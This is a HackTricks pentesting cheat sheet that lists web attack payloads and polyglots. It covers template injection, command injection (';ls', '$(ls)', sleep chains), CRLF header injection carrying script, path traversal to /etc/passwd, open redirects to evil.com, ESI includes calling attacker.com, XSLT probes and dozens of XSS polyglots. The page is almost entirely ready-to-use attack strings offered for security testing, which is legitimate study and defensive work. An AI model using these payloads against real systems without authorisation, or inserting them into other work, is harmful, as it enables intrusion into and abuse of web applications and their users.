---
title: "Reflecting Techniques - PoCs and Polygloths CheatSheet"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/pocs-and-polygloths-cheatsheet/index.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## Polyglots list <sup>\[\\[1\\]\](#references)</sup>

[\[1\]](#references)```
{{7*7}}[7*7]
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
%0d%0aLocation:%20http://attacker.com
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
<br><b><h1>THIS IS AN INJECTED TITLE </h1>
/etc/passwd
../../../../../../etc/hosts
..\..\..\..\..\..\etc/hosts
/etc/hostname
../../../../../../etc/hosts
C:/windows/system32/drivers/etc/hosts
../../../../../../windows/system32/drivers/etc/hosts
..\..\..\..\..\..\windows/system32/drivers/etc/hosts
http://asdasdasdasd.burpcollab.com/mal.php
\\asdasdasdasd.burpcollab.com/mal.php
www.whitelisted.com
www.whitelisted.com.evil.com
https://google.com
//google.com
javascript:alert(1)
(\\w*)+$
([a-zA-Z]+)*$
((a+)+)+$
<esi:include src=http://attacker.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
" onclick=alert() a="
'"><img src=x onerror=alert(1) />
javascript:alert()
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/index.html) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```
## [Client Side Template Injection](../client-side-template-injection-csti.html)

### [Basic Tests](#basic-tests)

```
{{7*7}}
[7*7]
```
### [Polygloths](#polygloths)

```
{{7*7}}[7*7]
```
## [Command Injection](../command-injection.html)

### [Basic Tests](#basic-tests-1)

```
;ls
||ls;
|ls;
&&ls;
&ls;
%0Als
`ls`
$(ls)
```
### [Polygloths](#polygloths-1)

```
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
## [CRLF](../crlf-0d-0a.html)

### [Basic Tests](#basic-tests-2)

```
%0d%0aLocation:%20http://attacker.com
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
## [Dangling Markup](#dangling-markup)

### [Basic Tests](#basic-tests-3)

```
<br><b><h1>THIS IS AND INJECTED TITLE </h1>
```
## [File Inclusion/Path Traversal](../file-inclusion/index.html)

### [Basic Tests](#basic-tests-4)

```
/etc/passwd
../../../../../../etc/hosts
..\..\..\..\..\..\etc/hosts
/etc/hostname
../../../../../../etc/hosts
C:/windows/system32/drivers/etc/hosts
../../../../../../windows/system32/drivers/etc/hosts
..\..\..\..\..\..\windows/system32/drivers/etc/hosts
http://asdasdasdasd.burpcollab.com/mal.php
\\asdasdasdasd.burpcollab.com/mal.php
```
## [Open Redirect](../open-redirect.html) / [Server Side Request Forgery](../ssrf-server-side-request-forgery/index.html)

### [Basic Tests](#basic-tests-5)

```
www.whitelisted.com
www.whitelisted.com.evil.com
https://google.com
//google.com
javascript:alert(1)
```
## [ReDoS](../regular-expression-denial-of-service-redos.html)

### [Basic Tests](#basic-tests-6)

```
(\\w*)+$
([a-zA-Z]+)*$
((a+)+)+$
```
## [Server Side Inclusion/Edge Side Inclusion](../server-side-inclusion-edge-side-inclusion-injection.html)

### [Basic Tests](#basic-tests-7)

```
<esi:include src=http://attacker.com/>
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
```
### [Polygloths](#polygloths-2)

```
<esi:include src=http://attacker.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
```
## [Server Side Request Forgery](../ssrf-server-side-request-forgery/index.html)

The same tests used for Open Redirect can be used here.

## [Server Side Template Injection](../ssti-server-side-template-injection/index.html)

### [Basic Tests](#basic-tests-8)

```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
### [Polygloths](#polygloths-3)

```
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
```
## [XSLT Server Side Injection](../xslt-server-side-injection-extensible-stylesheet-language-transformations.html)

### [Basic Tests](#basic-tests-9)

```
<xsl:value-of select="system-property('xsl:version')" />
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
```
### [Polygloths](#polygloths-4)

```
<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
```
## [XSS](#xss)

### [Basic Tests](#basic-tests-10)

```
" onclick=alert() a="
'"><img src=x onerror=alert(1) />
javascript:alert()
```
### [Polygloths](#polygloths-5)

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/index.html) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
<svg%0Ao%00nload=%09((pro\u006dpt))()//
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
%0ajavascript:`/*\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=document.location=`//localhost/mH`//>
```
## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
